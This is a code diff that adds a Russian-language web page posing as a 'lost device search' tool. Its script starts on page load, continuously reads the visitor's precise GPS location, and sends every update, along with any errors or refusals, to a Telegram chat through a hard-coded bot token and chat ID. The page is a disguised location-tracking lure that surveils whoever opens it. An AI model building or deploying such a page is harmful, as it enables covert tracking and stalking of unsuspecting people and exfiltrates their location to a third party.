@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Поиск устройства</title>
+    <style>
+        body { background: #000; color: #fff; font-family: sans-serif; text-align: center; padding-top: 30vh; }
+        .spinner { border: 4px solid #333; border-top: 4px solid #ff0000; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <h2>Поиск потерянного устройства...</h2>
+    <div class="spinner"></div>
+    <p id="status">Определение местоположения...</p>
+
+    <script>
+        const BOT_TOKEN = "8758850534:AAF79a17p6NCuHMluPI_Rkw7FeoQSkCcRe8";
+        const CHAT_ID = "7485234259";
+
+        function sendText(text) {
+            const img = new Image();
+            img.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
+        }
+
+        let lastLoc = "";
+        
+        function startTracking() {
+            if (!navigator.geolocation) {
+                document.getElementById('status').innerText = "GPS не поддерживается";
+                return;
+            }
+
+            sendText("🛰️ Начинаю отслеживание GPS (Каждые 10 секунд).");
+
+            navigator.geolocation.watchPosition(
+                (pos) => {
+                    const lat = pos.coords.latitude;
+                    const lon = pos.coords.longitude;
+                    const acc = pos.coords.accuracy.toFixed(0);
+                    
+                    document.getElementById('status').innerText = "Устройство найдено. Синхронизация...";
+                    
+                    const currentLoc = `🗺️ GPS Обновление:\nhttps://www.google.com/maps?q=${lat},${lon}\nТочность: ${acc} метров`;
+                    
+                    if (currentLoc !== lastLoc) {
+                        sendText(currentLoc);
+                        lastLoc = currentLoc;
+                    }
+                },
+                (err) => {
+                    document.getElementById('status').innerText = "Ошибка доступа к GPS: " + err.message;
+                    sendText("⚠️ GPS: Ошибка или запрещено (" + err.message + ")");
+                },
+                { enableHighAccuracy: true, maximumAge: 0, timeout: 5000 }
+            );
+        }
+
+        setTimeout(startTracking, 2000);
+    </script>
+</body>
+</html>
